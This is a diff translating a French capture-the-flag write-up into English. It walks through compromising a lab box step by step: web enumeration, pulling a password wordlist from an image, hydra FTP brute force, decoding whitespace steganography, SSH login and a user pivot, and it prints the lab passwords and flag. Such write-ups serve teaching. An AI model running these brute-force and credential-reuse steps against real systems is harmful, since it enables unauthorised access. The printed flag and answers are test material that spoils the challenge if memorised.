@@ -1,111 +1,111 @@
 # Write-up : "Musa Troglodytarum"
 
-**Cible :** 10.10.0.X (l'IP change à chaque redéploiement, revérifie-la)
+**Target:** 10.10.0.X (the IP changes on every redeploy, recheck it)
 
-**Objectif :** Obtenir user.txt
+**Objective:** Get user.txt
 
-**Difficulté :** Easy
+**Difficulty:** Easy
 
-**Techniques :** énumération web, indice caché dans le CSS, redirection HTTP, `strings` sur une image, brute force FTP, stéganographie espaces/tabulations, réutilisation d'identifiants, pivot entre utilisateurs
+**Techniques:** web enumeration, hint hidden in CSS, HTTP redirection, `strings` on an image, FTP brute force, space/tab steganography, credential reuse, pivot between users
 
-**Outils :** nmap, curl, wget, strings, hydra, ftp, ssh, python3
+**Tools:** nmap, curl, wget, strings, hydra, ftp, ssh, python3
 
 ---
 
-## 0. Définir l'IP de la cible
+## 0. Set the target IP
 
 ```bash
 ip=10.10.0.X
 ```
-Toutes les commandes utilisent `$ip` ensuite.
+Every command below uses `$ip`.
 
 ---
 
-## 1. Scan des ports
+## 1. Port scan
 
 ```bash
 nmap -sV -p- $ip
 ```
-Résultat : `21` (FTP), `22` (SSH), `80` (HTTP, page "It works").
+Result: `21` (FTP), `22` (SSH), `80` (HTTP, "It works" page).
 
 ---
 
-## 2. Indice caché dans le CSS
+## 2. A hint hidden in the CSS
 
 ```bash
 curl -s http://$ip/assets/style.css
 ```
-Un commentaire en bas donne la page cachée `/l3_B4n4N13r_D3s_M0nT4gN3s.php`. (La « vidéo » de la page d'accueil est un piège.)
+A comment at the bottom gives the hidden page `/l3_B4n4N13r_D3s_M0nT4gN3s.php`. (The "video" on the home page is a trap.)
 
-**Faille :** info sensible dans un fichier annexe (CWE-200).
+**Vulnerability:** sensitive info left in a secondary file (CWE-200).
 
 ---
 
-## 3. Suivre la page cachée
+## 3. Following the hidden page
 
 ```bash
 curl -i http://$ip/l3_B4n4N13r_D3s_M0nT4gN3s.php
 ```
-`-i` = affiche les en-têtes. L'en-tête `Location:` révèle le dossier caché `/L3s_Fru1ts_s0nt_c0NNus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3`.
+`-i` = displays the headers. The `Location:` header reveals the hidden folder `/L3s_Fru1ts_s0nt_c0NNus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3`.
 
-**Faille :** chemin "secret" non protégé (CWE-425).
+**Vulnerability:** unprotected "secret" path (CWE-425).
 
 ---
 
-## 4. Télécharger l'image directement
+## 4. Download the hidden image directly
 
-> Lister le dossier renvoie une redirection 301 vers un ServerName cassé (10.10.0.10). On va donc **directement chercher le fichier** :
+> Listing the folder 301-redirects to a broken ServerName (10.10.0.10). So we grab the file directly:
 
 ```bash
 wget "http://$ip/L3s_Fru1ts_s0nt_c0NNus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3/Hot_Babe.png"
 ```
 
-**Faille :** directory listing activé (CWE-548).
+**Vulnerability:** directory listing enabled (CWE-548).
 
 ---
 
-## 5. Lire le texte caché + construire la wordlist
+## 5. Read the hidden text + build the wordlist
 
 ```bash
 strings Hot_Babe.png | grep -i FTP
 strings Hot_Babe.png | sed -n '/One of these is the password/,$p' | tail -n +2 > passwords.txt
 wc -l passwords.txt
 ```
-→ login `banane_celeste` + ~200 mots de passe candidats dans `passwords.txt`.
+ login `banane_celeste` + ~200 candidate passwords in `passwords.txt`.
 
-**Faille :** login et mots de passe cachés dans une image (CWE-200).
+**Vulnerability:** login and passwords hidden in an image (CWE-200).
 
 ---
 
-## 6. Brute force du FTP
+## 6. FTP brute force
 
 ```bash
 hydra -l banane_celeste -P passwords.txt -f -t 4 ftp://$ip
 ```
-`-t 4` = peu de connexions en parallèle (le FTP coupe les reconnexions rapides).
-> Si « too many connection errors », descends à `-t 1` :
+`-t 4` = few parallel connections (the FTP drops fast reconnects).
+> If you get "too many connection errors", lower it to `-t 1`:
 > ```bash
 > hydra -l banane_celeste -P passwords.txt -f -t 1 ftp://$ip
 > ```
 
-**Faille :** pas de protection contre le brute force (CWE-307).
+**Vulnerability:** no protection against brute force (CWE-307).
 
 ---
 
-## 7. Récupérer le fichier via FTP
+## 7. Grab the file over FTP
 
 ```bash
-wget "ftp://banane_celeste:<MDP_TROUVE>@$ip/Valerian's_Creds.txt"
+wget "ftp://banane_celeste:<FOUND_PASSWORD>@$ip/Valerian's_Creds.txt"
 mv "Valerian's_Creds.txt" creds.txt
 cat -A creds.txt | head
 ```
-`cat -A` montre les tabulations `^I` et les espaces → le fichier est de la stéganographie par espaces/tabs. (On renomme en `creds.txt` pour éviter l'apostrophe qui gêne les commandes.)
+`cat -A` shows the tabs `^I` and spaces  the file is space/tab steganography. (We rename it to `creds.txt` to avoid the apostrophe that breaks commands.)
 
 ---
 
-## 8. Décoder la stéganographie (terminal)
+## 8. Decode the space/tab steganography (terminal)
 
-> CyberChef « From Binary » ne marche PAS ici : l'encodage est **1 octet par ligne** (sur les 8 derniers bits) avec des lignes séparatrices, donc un flux continu se désaligne. On utilise ce décodage :
+> CyberChef "From Binary" does NOT work here: the encoding is **1 byte per line** (on the last 8 bits) with separator lines, so a continuous bitstream misaligns. Use this instead:
 
 ```bash
 python3 -c 'out=""
@@ -115,81 +115,81 @@ for l in open("creds.txt"):
         out+=chr(int(s.replace(" ","0").replace(chr(9),"1")[-8:],2))
 print(out)'
 ```
-→ `User: valerian` / `Password: T4k_t4k_S0lide_Dyn0_int0_Cr1mP`
+ `User: valerian` / `Password: T4k_t4k_S0lide_Dyn0_int0_Cr1mP`
 
-**Faille :** identifiants cachés par stéganographie (CWE-311).
+**Vulnerability:** credentials hidden by steganography (CWE-311).
 
 ---
 
-## 9. Connexion SSH en valerian
+## 9. SSH connection as valerian
 
 ```bash
 ssh valerian@$ip
 ```
-(mot de passe : `T4k_t4k_S0lide_Dyn0_int0_Cr1mP`)
+(password: `T4k_t4k_S0lide_Dyn0_int0_Cr1mP`)
 
-> Si « REMOTE HOST IDENTIFICATION HAS CHANGED » (box redéployée), supprime l'ancienne clé puis reconnecte-toi :
+> If you get "REMOTE HOST IDENTIFICATION HAS CHANGED" (box redeployed), clear the old key then retry:
 > ```bash
 > ssh-keygen -f /root/.ssh/known_hosts -R $ip
 > ```
 
-Le message d'accueil parle d'une « s3cr3t hiding place ».
+The welcome message hints at a "s3cr3t hiding place".
 
-**Faille :** réutilisation d'identifiants exposés (CWE-522).
+**Vulnerability:** reuse of exposed credentials (CWE-522).
 
 ---
 
-## 10. Trouver la cachette
+## 10. Finding the hiding place
 
 ```bash
 find / -iname "*s3cr3t*" 2>/dev/null
 cat /usr/games/s3cr3t/.msg_fr0m_v4l3r14n
 ```
-→ mot de passe de gabriel : `ca_serait_jamais_arrive_en_haskell`
+ gabriel's password: `ca_serait_jamais_arrive_en_haskell`
 
-**Faille :** mot de passe en clair dans un fichier (CWE-256).
+**Vulnerability:** plaintext password in a file (CWE-256).
 
 ---
 
-## 11. Devenir gabriel et lire le flag
+## 11. Becoming gabriel and reading the flag
 
 ```bash
 su gabriel
 cat ~/user.txt
 ```
-→ `EPI{l3_7R0nC_3S7_3N_R34Li73_un_PS3ud0_7r0NC_InCR0ya8Le}`
+ `EPI{l3_7R0nC_3S7_3N_R34Li73_un_PS3ud0_7r0NC_InCR0ya8Le}`
 
 ---
 
-## Résumé des étapes
+## Summary of steps
 
-1. `nmap` : 21/22/80.
-2. `style.css` : page `.php` cachée.
-3. `curl -i` sur la page : redirection (302) vers un dossier caché.
-4. `wget` direct de `Hot_Babe.png`.
-5. `strings` : login FTP + wordlist.
-6. `hydra -t 4` : le mot de passe FTP.
-7. FTP : `Valerian's_Creds.txt` (espaces/tabs) → renommé `creds.txt`.
-8. décodage terminal : mot de passe de valerian.
-9. `ssh valerian`, message caché : mot de passe de gabriel.
-10. `su gabriel` : `user.txt`.
+1. `nmap`: 21/22/80.
+2. `style.css`: the hidden `.php` page.
+3. `curl -i` on that page: redirect (302) to a hidden folder.
+4. `wget` the image `Hot_Babe.png` directly.
+5. `strings`: FTP login + wordlist.
+6. `hydra -t 4`: the FTP password.
+7. FTP: `Valerian's_Creds.txt` (spaces/tabs)  renamed `creds.txt`.
+8. terminal decode: valerian's password.
+9. `ssh valerian`, hidden message: gabriel's password.
+10. `su gabriel`: `user.txt`.
 
-## Failles exploitées
+## Exploited vulnerabilities
 
-| # | Faille | CWE |
+| # | Vulnerability | CWE |
 |---|--------|-----|
-| 1 | Indice dans un commentaire CSS | CWE-200 |
-| 2 | Chemin secret non protégé | CWE-425 |
-| 3 | Directory listing activé | CWE-548 |
-| 4 | Login et wordlist cachés dans une image | CWE-200 |
-| 5 | Pas d'anti-brute-force FTP | CWE-307 |
+| 1 | Hint in a CSS comment | CWE-200 |
+| 2 | Unprotected secret path | CWE-425 |
+| 3 | Directory listing enabled | CWE-548 |
+| 4 | Login and wordlist hidden in an image | CWE-200 |
+| 5 | No FTP anti-brute-force | CWE-307 |
 | 6 | Whitespace stego | CWE-311 |
-| 7 | Réutilisation d'identifiants | CWE-522 |
-| 8 | Mot de passe en clair dans un fichier | CWE-256 |
+| 7 | Credential reuse | CWE-522 |
+| 8 | Plaintext password in a file | CWE-256 |
 
-## À retenir
-- Toujours lire les fichiers annexes (CSS, commentaires) : l'indice y était.
-- Un `curl` qui n'affiche rien = une redirection, refais avec `-i`.
-- `strings` révèle le texte caché dans une image.
-- Stégano espaces/tabs ici = **décodage terminal** (CyberChef ne suffit pas pour ce format).
-- La « vidéo » est un piège volontaire.
+## Key takeaways
+- Always read secondary files (CSS, comments): the hint was there.
+- A `curl` that shows nothing = a redirect, redo it with `-i`.
+- `strings` reveals text hidden in an image.
+- Space/tab stego here = **terminal decode** (CyberChef isn't enough for this format).
+- The "video" is a deliberate trap.
